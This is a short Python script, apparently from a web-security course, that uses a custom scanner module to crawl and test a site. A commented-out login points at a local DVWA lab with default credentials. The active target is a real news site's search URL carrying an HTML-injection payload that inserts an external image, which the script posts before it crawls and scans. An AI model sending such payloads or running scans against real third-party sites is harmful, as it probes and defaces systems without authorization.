#!/usr/bin/env python
import scanner

target_url = "http://www.telegraph.co.uk/search/?queryText=%22%3E%3Cimg%20src=%22http://i55.tinypic.com/witu7d.png%22%20height=%22650%22%20width=%221000%22%3E"
links_to_ignore = ["http://127.0.0.1/DVWA/logout.php"]
data_dict = {"username": "admin", "password": "password", "Login": "Login"}

vuln_scanner = scanner.Scanner(target_url, links_to_ignore)
#vuln_scanner.session.post("http://127.0.0.1/DVWA/login.php", data=data_dict)
vuln_scanner.session.post("http://www.telegraph.co.uk/search/?queryText=%22%3E%3Cimg%20src=%22http://i55.tinypic.com/witu7d.png%22%20height=%22650%22%20width=%221000%22%3E")
vuln_scanner.crawl()
vuln_scanner.run_scanner()
